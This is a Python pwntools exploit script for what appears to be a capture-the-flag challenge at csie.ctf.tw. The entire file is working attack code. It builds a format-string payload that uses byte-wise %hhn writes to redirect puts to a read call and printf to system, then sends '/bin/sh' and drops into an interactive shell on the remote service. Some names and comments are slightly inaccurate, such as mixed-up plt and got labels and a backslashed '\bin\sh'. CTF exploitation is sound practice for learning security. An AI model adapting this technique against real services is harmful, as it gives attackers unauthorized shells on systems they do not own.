from pwn import *

context.arch = 'amd64'

host = 'csie.ctf.tw'
port = 10134
# host = '127.0.0.1'
# port = 8888
r = remote(host, port)

# input('Press ENTER to continue.')

puts_plt = 0x0000000000601018
printf_plt = 0x0000000000601030
system_got = 0x4005a0
call_read = 0x0000000000400747

def fmt(prev, val, idx):
    ret = ''
    if val > prev:
        ret = '%' + str(val - prev) + 'c'
    elif val < prev:
        ret = '%' + str(0x100 + val - prev) + 'c'
    ret += '%' + str(idx) + '$hhn'
    return ret.encode()

# Let puts_plt become call_read, so that we can read again.
new_plt = call_read
payload = b''
idx = 22
prev = 0
for i in range(6):
    val = (new_plt >> (8*i)) & 0xff
    payload += fmt(prev, val, idx+i)
    prev = val

# Let printf_plt become system, so that we let it call `system('\bin\sh')`
new_plt = system_got
idx = 22+6
for i in range(6):
    val = (new_plt >> (8*i)) & 0xff
    payload += fmt(prev, val, idx+i)
    prev = val

print(hex(len(payload)))
payload = payload.ljust(0x80, b'a')
payload += flat([puts_plt, puts_plt+1, puts_plt+2, puts_plt+3, puts_plt+4, puts_plt+5])
payload += flat([printf_plt, printf_plt+1, printf_plt+2, printf_plt+3, printf_plt+4, printf_plt+5])
print(hex(len(payload)))
r.recvuntil(':')
r.sendline(payload)
sleep(0.1)
r.sendline('/bin/sh')

r.interactive()
